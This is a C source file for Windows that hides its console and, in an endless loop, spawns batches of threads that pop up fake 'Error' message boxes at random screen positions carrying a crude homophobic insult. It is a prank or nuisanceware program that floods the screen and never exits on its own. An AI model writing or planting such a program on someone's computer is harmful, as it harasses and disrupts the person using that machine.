#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <commctrl.h>

__thread int MsgBox_X;
__thread int MsgBox_Y;
    
static void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
    if ((GetWindowLongPtr(hwnd, GWL_STYLE) & WS_CHILD) == 0) 
        SetWindowPos(hwnd, NULL, MsgBox_X, MsgBox_Y, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
}
    
int MessageBoxPos(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType, int X, int Y)
{
    HWINEVENTHOOK hHook = SetWinEventHook(EVENT_OBJECT_CREATE, EVENT_OBJECT_CREATE, NULL, &WinEventProc, GetCurrentProcessId(), GetCurrentThreadId(), WINEVENT_OUTOFCONTEXT);
    MsgBox_X = X;
    MsgBox_Y = Y;
    int result = MessageBox(hWnd, lpText, lpCaption, uType);
    if (hHook)  UnhookWinEvent(hHook);
    return result;
}

DWORD thread_proc(void *param)
{
	srand((int)param);
	int x = (rand() / (RAND_MAX / 800));
	int y = (rand() / (RAND_MAX / 800));
	//printf("%d,%d\n", x, y);
	MessageBoxPos(NULL, "Ur mom is gay! You will be banned from the United Soviet Socalist Republics", "Error", 
		MB_OK | MB_ICONERROR, x, y);
	return 0;
}

int main(int argc, char** argv)
{

//fprintf(stderr, "Process Path: %s\n", argv[0]);
ShowWindow(GetConsoleWindow(), SW_HIDE);
HANDLE threads[100] = {NULL};
srand(time(NULL));
while(1)
{
int N = rand() / (RAND_MAX/20);
for(int i = 0; i <= N; i++)
{
	threads[i] = CreateThread(NULL, 0, thread_proc, (void*)rand(), 0, NULL);
}
for(int i = 0; i <= N; i++)
{
	
	DWORD exit_code = STILL_ACTIVE;
	while(exit_code == STILL_ACTIVE)
		GetExitCodeThread(threads[i], &exit_code);
	TerminateThread(threads[i], 0);
	threads[i] = NULL;
}

}


return 0;

}
